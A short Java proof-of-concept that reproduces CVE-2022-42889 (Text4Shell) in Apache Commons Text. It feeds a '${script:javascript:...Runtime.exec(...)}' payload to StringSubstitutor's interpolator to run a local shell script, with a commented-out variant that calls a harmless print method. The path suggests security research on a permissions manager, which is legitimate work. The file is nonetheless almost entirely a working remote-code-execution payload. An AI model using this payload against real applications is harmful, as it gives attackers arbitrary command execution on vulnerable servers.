package com.anonuser;

import org.apache.commons.text.StringSubstitutor;

public class CommonsText_CVE_2022_42889 {

    public static void main(String[] args) {

        // Executes the command in the create_file.sh script

        System.out.println("Recreating CVE-2022-42889");
        
        String requestInput = "${script:javascript:java.lang.Runtime.getRuntime()" +
               ".exec('/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh')}";

        // String requestInput = "${script:javascript:com.anonuser.CommonsText_CVE_2022_42889.exploitMethod()}";

        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();

        String replacedInput = interpolator.replace(requestInput);

        System.out.println(replacedInput);
    }

    public static void exploitMethod() {
        System.out.println("Exploited!!!");
    }
}
